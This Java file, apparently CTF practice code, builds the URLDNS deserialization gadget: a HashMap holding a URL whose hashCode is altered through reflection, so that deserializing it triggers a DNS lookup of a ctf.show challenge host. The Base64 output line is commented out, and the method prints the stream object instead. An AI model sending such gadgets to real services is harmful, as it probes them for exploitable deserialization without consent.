package Seri;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
//import java.util.Base64;
import java.util.HashMap;

public class SeriDemo {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        HashMap<Object ,Integer> hashmap = new HashMap<Object ,Integer>();
        URL url = new URL("http://3be2860e-cfed-4b46-a9f3-0909d55110de.challenge.ctf.show/");
        Class c = url.getClass();
        Field hashCodeField = c.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url ,12345789);
        hashmap.put(url,1);
        hashCodeField.set(url ,-1);
        serializeBase64(hashmap);


    }

    public static void serializeFile(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void serializeBase64(Object obj) throws IOException{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.flush();
        System.out.println(oos);
//        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
